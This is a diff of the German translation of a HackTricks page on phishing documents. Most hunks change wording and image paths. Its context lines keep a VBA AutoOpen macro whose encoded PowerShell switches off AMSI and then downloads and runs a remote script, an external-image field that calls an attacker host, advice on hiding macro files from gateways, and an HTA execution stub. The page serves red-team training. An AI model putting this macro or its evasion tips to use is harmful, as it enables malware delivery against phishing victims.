@@ -1,15 +1,15 @@
 # Phishing-Dateien & Dokumente
 
 {% hint style="success" %}
-Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lerne & übe AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Lerne & übe GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Unterstütze HackTricks</summary>
 
 * Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
-* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
 * **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.
 
 </details>
@@ -17,7 +17,7 @@ Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size=
 
 ## Office-Dokumente
 
-Microsoft Word führt eine Datenvalidierung von Dateien durch, bevor eine Datei geöffnet wird. Die Datenvalidierung erfolgt in Form der Identifizierung von Datenstrukturen gemäß dem OfficeOpenXML-Standard. Wenn während der Identifizierung der Datenstruktur ein Fehler auftritt, wird die analysierte Datei nicht geöffnet.
+Microsoft Word führt eine Datenvalidierung der Datei durch, bevor eine Datei geöffnet wird. Die Datenvalidierung erfolgt in Form der Identifizierung der Datenstruktur, gemäß dem OfficeOpenXML-Standard. Wenn während der Identifizierung der Datenstruktur ein Fehler auftritt, wird die analysierte Datei nicht geöffnet.
 
 In der Regel verwenden Word-Dateien, die Makros enthalten, die Erweiterung `.docm`. Es ist jedoch möglich, die Datei umzubenennen, indem man die Dateierweiterung ändert und dennoch die Fähigkeit zur Ausführung von Makros beibehält.\
 Zum Beispiel unterstützt eine RTF-Datei aus Designgründen keine Makros, aber eine in RTF umbenannte DOCM-Datei wird von Microsoft Word verarbeitet und kann Makros ausführen.\
@@ -27,16 +27,16 @@ Du kannst den folgenden Befehl verwenden, um zu überprüfen, welche Erweiterung
 ```bash
 assoc | findstr /i "word excel powerp"
 ```
-DOCX-Dateien, die auf eine entfernte Vorlage verweisen (Datei – Optionen – Add-Ins – Verwalten: Vorlagen – Gehe zu), können ebenfalls Makros „ausführen“.
+DOCX-Dateien, die auf eine entfernte Vorlage verweisen (Datei – Optionen – Add-Ins – Verwalten: Vorlagen – Gehe zu), können ebenfalls „Makros“ ausführen.
 
 ### Externe Bildladung
 
-Gehe zu: _Einfügen --> Schnellbausteine --> Feld_\
-_**Kategorien**: Links und Verweise, **Feldnamen**: includePicture, und **Dateiname oder URL**:_ http://\<ip>/whatever
+Gehe zu: _Einfügen --> Schnelle Teile --> Feld_\
+&#xNAN;_**Kategorien**: Links und Verweise, **Feldnamen**: includePicture, und **Dateiname oder URL**:_ http://\<ip>/whatever
 
 ![](<../../.gitbook/assets/image (155).png>)
 
-### Makros Backdoor
+### Makros-Hintertür
 
 Es ist möglich, Makros zu verwenden, um beliebigen Code aus dem Dokument auszuführen.
 
@@ -47,7 +47,7 @@ Je häufiger sie sind, desto wahrscheinlicher wird sie die AV erkennen.
 * AutoOpen()
 * Document\_Open()
 
-#### Makros Codebeispiele
+#### Makros-Codebeispiele
 ```vba
 Sub AutoOpen()
 CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
@@ -83,8 +83,8 @@ Gehe zu **Datei > Informationen > Dokument überprüfen > Dokument überprüfen*
 
 #### Doc-Erweiterung
 
-Wenn du fertig bist, wähle im Dropdown **Dateityp speichern als** das Format von **`.docx`** auf **Word 97-2003 `.doc`** zu ändern.\
-Mach das, weil du **keine Makros in einer `.docx`** speichern kannst und es ein **Stigma** **um** die makroaktivierte **`.docm`** Erweiterung gibt (z.B. hat das Miniaturansichts-Icon ein riesiges `!` und einige Web-/E-Mail-Gateways blockieren sie vollständig). Daher ist diese **Legacy `.doc` Erweiterung der beste Kompromiss**.
+Wenn du fertig bist, wähle im Dropdown **Speichern unter** das Format von **`.docx`** auf **Word 97-2003 `.doc`** zu ändern.\
+Mach das, weil du **keine Makros in einer `.docx`** speichern kannst und es ein **Stigma** **um** die makroaktivierte **`.docm`** Erweiterung gibt (z.B. hat das Miniaturansichts-Icon ein riesiges `!` und einige Web-/E-Mail-Gateways blockieren sie vollständig). Daher ist diese **Legacy `.doc`-Erweiterung der beste Kompromiss**.
 
 #### Bösartige Makro-Generatoren
 
@@ -96,7 +96,7 @@ Mach das, weil du **keine Makros in einer `.docx`** speichern kannst und es ein 
 
 Eine HTA ist ein Windows-Programm, das **HTML und Skriptsprachen (wie VBScript und JScript)** kombiniert. Es generiert die Benutzeroberfläche und wird als "vollständig vertrauenswürdige" Anwendung ausgeführt, ohne die Einschränkungen des Sicherheitsmodells eines Browsers.
 
-Eine HTA wird mit **`mshta.exe`** ausgeführt, das typischerweise **zusammen mit** **Internet Explorer** **installiert** wird, wodurch **`mshta` von IE abhängig ist**. Wenn es also deinstalliert wurde, können HTAs nicht ausgeführt werden.
+Eine HTA wird mit **`mshta.exe`** ausgeführt, das typischerweise **zusammen mit** **Internet Explorer** **installiert** wird, wodurch **`mshta` von IE abhängig ist**. Wenn es deinstalliert wurde, können HTAs nicht ausgeführt werden.
 ```html
 <--! Basic HTA Execution -->
 <html>
@@ -173,15 +173,15 @@ Vergessen Sie nicht, dass Sie nicht nur den Hash oder die Authentifizierung steh
 * [**AD CS ESC8 (NTLM-Relay zu Zertifikaten)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
 
 {% hint style="success" %}
-Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lernen & üben Sie AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>HackTricks unterstützen</summary>
 
 * Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
-* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
 * **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
